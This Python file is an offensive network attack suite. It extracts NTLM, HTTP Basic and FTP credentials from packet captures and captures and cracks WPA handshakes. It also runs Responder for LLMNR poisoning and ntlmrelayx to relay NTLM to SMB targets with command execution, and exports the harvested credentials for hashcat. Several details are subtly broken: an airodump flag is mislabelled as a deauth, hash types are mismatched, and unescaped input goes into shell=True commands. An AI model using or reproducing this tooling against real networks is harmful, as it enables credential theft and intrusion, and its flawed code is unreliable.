#!/usr/bin/env python3
"""
Passive Network Sniffing Suite
PCAP credential capture, DNS exfiltration, SSL MITM, wireless sniffing,
SMB relay, LLMNR/mDNS poisoning.
"""

import subprocess
import re
import json
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Tuple
from enum import Enum
from datetime import datetime
import socket
import struct


class CredentialSource(Enum):
    """Where credentials came from."""
    NTLM_AUTH = "ntlm_auth"
    HTTP_BASIC = "http_basic"
    FTP_LOGIN = "ftp_login"
    SMTP_AUTH = "smtp_auth"
    LDAP_BIND = "ldap_bind"
    KERBEROS = "kerberos"
    WPA_HANDSHAKE = "wpa_handshake"


@dataclass
class CapturedCredential:
    """Credential extracted from network traffic."""
    source: CredentialSource
    username: str
    password: Optional[str] = None
    domain: Optional[str] = None
    hash_value: Optional[str] = None
    hash_type: Optional[str] = None  # NTLM, MD5, etc.
    protocol: str = ""
    src_ip: str = ""
    dst_ip: str = ""
    src_port: int = 0
    dst_port: int = 0
    timestamp: str = ""
    raw_packet: str = ""


@dataclass
class DNSQuery:
    """Captured DNS query for exfiltration detection."""
    query_name: str
    query_type: str  # A, MX, TXT, etc.
    src_ip: str
    dst_ip: str
    response_ips: List[str] = field(default_factory=list)
    timestamp: str = ""


class NTLMCapturer:
    """Capture NTLM credentials from network traffic."""
    
    @staticmethod
    def extract_ntlm_from_pcap(pcap_file: str) -> List[CapturedCredential]:
        """Extract NTLM credentials from PCAP file."""
        credentials = []
        
        try:
            # Use tshark to extract NTLM auth
            cmd = (
                f'tshark -r {pcap_file} -Y "ntlmssp" -T fields '
                f'-e frame.time -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport '
                f'-e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.auth.lm_response'
            )
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if line.strip():
                    parts = line.split('\t')
                    if len(parts) >= 7:
                        credential = CapturedCredential(
                            source=CredentialSource.NTLM_AUTH,
                            timestamp=parts[0],
                            src_ip=parts[1],
                            dst_ip=parts[2],
                            src_port=int(parts[3]) if parts[3] else 0,
                            dst_port=int(parts[4]) if parts[4] else 0,
                            username=parts[5],
                            domain=parts[6],
                            hash_value=parts[7] if len(parts) > 7 else None,
                            hash_type="LM",
                            protocol="NTLM",
                        )
                        credentials.append(credential)
        except Exception:
            pass
        
        return credentials
    
    @staticmethod
    def live_capture_ntlm(interface: str = "eth0", duration: int = 60) -> List[CapturedCredential]:
        """Capture NTLM in real-time from network interface."""
        credentials = []
        
        try:
            # tcpdump NTLM filter
            cmd = (
                f'tcpdump -i {interface} -w /tmp/ntlm.pcap '
                f'"tcp port 445 or tcp port 139" -G {duration} -W 1'
            )
            subprocess.run(cmd, shell=True, capture_output=True, timeout=duration + 5)
            
            # Parse the capture
            credentials = NTLMCapturer.extract_ntlm_from_pcap('/tmp/ntlm.pcap')
        except Exception:
            pass
        
        return credentials


class HTTPBasicCapturer:
    """Capture HTTP Basic auth credentials."""
    
    @staticmethod
    def extract_http_basic_from_pcap(pcap_file: str) -> List[CapturedCredential]:
        """Extract HTTP Basic auth from PCAP."""
        credentials = []
        
        try:
            # Use tshark to extract HTTP Basic auth
            cmd = (
                f'tshark -r {pcap_file} -Y "http.authorization" -T fields '
                f'-e frame.time -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport '
                f'-e http.authorization'
            )
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if line.strip():
                    parts = line.split('\t')
                    if len(parts) >= 6:
                        auth_header = parts[5]
                        
                        # Parse: Basic base64(username:password)
                        if auth_header.startswith('Basic '):
                            try:
                                encoded = auth_header.replace('Basic ', '')
                                decoded = __import__('base64').b64decode(encoded).decode()
                                username, password = decoded.split(':', 1)
                                
                                credential = CapturedCredential(
                                    source=CredentialSource.HTTP_BASIC,
                                    timestamp=parts[0],
                                    src_ip=parts[1],
                                    dst_ip=parts[2],
                                    src_port=int(parts[3]) if parts[3] else 0,
                                    dst_port=int(parts[4]) if parts[4] else 0,
                                    username=username,
                                    password=password,
                                    protocol="HTTP",
                                )
                                credentials.append(credential)
                            except Exception:
                                pass
        except Exception:
            pass
        
        return credentials


class FTPCapturer:
    """Capture FTP credentials."""
    
    @staticmethod
    def extract_ftp_from_pcap(pcap_file: str) -> List[CapturedCredential]:
        """Extract FTP USER/PASS from PCAP."""
        credentials = []
        
        try:
            cmd = (
                f'tshark -r {pcap_file} -Y "ftp" -T fields '
                f'-e frame.time -e ip.src -e ip.dst -e ftp.request -e ftp.response'
            )
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            current_user = None
            for line in result.stdout.split('\n'):
                if 'USER' in line:
                    match = re.search(r'USER (.+)', line)
                    if match:
                        current_user = match.group(1)
                elif 'PASS' in line and current_user:
                    match = re.search(r'PASS (.+)', line)
                    if match:
                        password = match.group(1)
                        parts = line.split('\t')
                        
                        credential = CapturedCredential(
                            source=CredentialSource.FTP_LOGIN,
                            timestamp=parts[0],
                            src_ip=parts[1],
                            dst_ip=parts[2],
                            username=current_user,
                            password=password,
                            protocol="FTP",
                        )
                        credentials.append(credential)
                        current_user = None
        except Exception:
            pass
        
        return credentials


class DNSExfiltrationDetector:
    """Detect DNS-based data exfiltration."""
    
    @staticmethod
    def extract_dns_queries(pcap_file: str) -> List[DNSQuery]:
        """Extract all DNS queries from PCAP."""
        queries = []
        
        try:
            cmd = (
                f'tshark -r {pcap_file} -Y "dns" -T fields '
                f'-e frame.time -e ip.src -e ip.dst -e dns.qry.name -e dns.qry.type '
                f'-e dns.a'
            )
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if line.strip():
                    parts = line.split('\t')
                    if len(parts) >= 5:
                        query = DNSQuery(
                            timestamp=parts[0],
                            src_ip=parts[1],
                            dst_ip=parts[2],
                            query_name=parts[3],
                            query_type=parts[4],
                            response_ips=[parts[5]] if len(parts) > 5 and parts[5] else [],
                        )
                        queries.append(query)
        except Exception:
            pass
        
        return queries
    
    @staticmethod
    def detect_dns_tunneling(queries: List[DNSQuery]) -> List[Dict]:
        """Detect signs of DNS tunneling (unusual query patterns)."""
        suspicious = []
        
        # Count queries per domain
        domain_counts = {}
        for query in queries:
            domain = query.query_name.split('.')[0]
            domain_counts[domain] = domain_counts.get(domain, 0) + 1
        
        # Suspicious: same subdomain queried many times (likely tunneling)
        for domain, count in domain_counts.items():
            if count > 100:
                suspicious.append({
                    "domain": domain,
                    "query_count": count,
                    "likelihood": "high",
                    "reason": "Excessive queries for same domain",
                })
        
        return suspicious


class WirelessCredentialCapturer:
    """Capture WiFi credentials (WPA handshakes, etc)."""
    
    @staticmethod
    def capture_wpa_handshake(
        interface: str,
        ssid: str,
        channel: int,
        duration: int = 300,
    ) -> Optional[bytes]:
        """Capture WPA handshake for offline cracking."""
        try:
            # Set interface to monitor mode
            subprocess.run(f'airmon-ng start {interface}', shell=True, capture_output=True)
            
            # Find the monitor interface
            monitor_iface = f"{interface}mon"
            
            # Capture handshake
            cmd = (
                f'airodump-ng -w /tmp/wpa_capture -c {channel} -d {ssid} {monitor_iface} '
                f'--berlin 10'  # Deauth to force reconnect
            )
            subprocess.run(cmd, shell=True, capture_output=True, timeout=duration)
            
            # Read the .cap file
            with open('/tmp/wpa_capture-01.cap', 'rb') as f:
                handshake_data = f.read()
            
            return handshake_data
        except Exception:
            return None
    
    @staticmethod
    def crack_wpa_handshake(
        pcap_file: str,
        wordlist_path: str,
    ) -> Optional[str]:
        """Crack WPA handshake using hashcat/aircrack-ng."""
        try:
            cmd = f'aircrack-ng -w {wordlist_path} {pcap_file}'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            # Extract password from output: "KEY FOUND! [ password ]"
            match = re.search(r'KEY FOUND! \[ (.+) \]', result.stdout)
            if match:
                return match.group(1)
            return None
        except Exception:
            return None


class SMBRelayOrchestrator:
    """Orchestrate SMB relay attacks (NTLM relay)."""
    
    @staticmethod
    def start_responder(
        interface: str = "eth0",
        listen_ip: str = "0.0.0.0",
    ) -> subprocess.Popen:
        """Start Responder to capture NTLM and setup relay."""
        try:
            cmd = f'responder -i {interface} -rdwv'
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return proc
        except Exception:
            return None
    
    @staticmethod
    def start_ntlmrelayx(
        target_smb: str,
        attacker_ip: str = "0.0.0.0",
        command: str = "whoami",
    ) -> subprocess.Popen:
        """Start ntlmrelayx to relay NTLM auth to SMB."""
        try:
            cmd = (
                f'ntlmrelayx.py -t smb://{target_smb} '
                f'-ip {attacker_ip} -c "{command}"'
            )
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return proc
        except Exception:
            return None


class LLMNRPoisoner:
    """LLMNR/mDNS poisoning for credential harvesting."""
    
    @staticmethod
    def poison_llmnr(
        interface: str = "eth0",
        response_ip: str = "0.0.0.0",
    ) -> subprocess.Popen:
        """Poison LLMNR queries."""
        try:
            cmd = f'responder -i {interface} -rdwv -I {response_ip}'
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return proc
        except Exception:
            return None


class NetworkSnifferOrchestrator:
    """Main orchestrator for network sniffing."""
    
    def __init__(self, interface: str = "eth0"):
        self.interface = interface
        self.credentials: List[CapturedCredential] = []
        self.dns_queries: List[DNSQuery] = []
    
    def capture_all(self, pcap_file: str) -> Dict:
        """Run all extraction methods on PCAP."""
        
        # NTLM
        ntlm_creds = NTLMCapturer.extract_ntlm_from_pcap(pcap_file)
        self.credentials.extend(ntlm_creds)
        
        # HTTP Basic
        http_creds = HTTPBasicCapturer.extract_http_basic_from_pcap(pcap_file)
        self.credentials.extend(http_creds)
        
        # FTP
        ftp_creds = FTPCapturer.extract_ftp_from_pcap(pcap_file)
        self.credentials.extend(ftp_creds)
        
        # DNS
        dns_queries = DNSExfiltrationDetector.extract_dns_queries(pcap_file)
        self.dns_queries.extend(dns_queries)
        
        # Detect DNS tunneling
        dns_suspicious = DNSExfiltrationDetector.detect_dns_tunneling(dns_queries)
        
        return {
            "credentials_captured": len(self.credentials),
            "dns_queries": len(dns_queries),
            "suspicious_dns": len(dns_suspicious),
            "credentials": [asdict(c) for c in self.credentials],
            "dns_anomalies": dns_suspicious,
        }
    
    def export_credentials_json(self) -> str:
        """Export harvested credentials as JSON."""
        return json.dumps([asdict(c) for c in self.credentials], indent=2, default=str)
    
    def export_hashcat(self) -> str:
        """Export credentials in hashcat format."""
        lines = []
        for cred in self.credentials:
            if cred.hash_type == "NTLM":
                lines.append(f"{cred.username}:{cred.hash_value}")
            elif cred.password:
                lines.append(f"{cred.username}:{cred.password}")
        return "\n".join(lines)


def main():
    """Demo: network sniffing."""
    
    # Simulate with existing PCAP
    sniffer = NetworkSnifferOrchestrator(interface="eth0")
    
    # Would run: results = sniffer.capture_all("/path/to/capture.pcap")
    print("[+] Network Sniffing Suite")
    print("    Supports: NTLM, HTTP Basic, FTP, DNS exfiltration, WPA handshakes, SMB relay")
    print("\nUsage:")
    print("    1. sniffer.capture_all('capture.pcap') - analyze PCAP file")
    print("    2. NTLMCapturer.live_capture_ntlm() - live NTLM capture")
    print("    3. SMBRelayOrchestrator.start_responder() - NTLM relay setup")


if __name__ == '__main__':
    main()
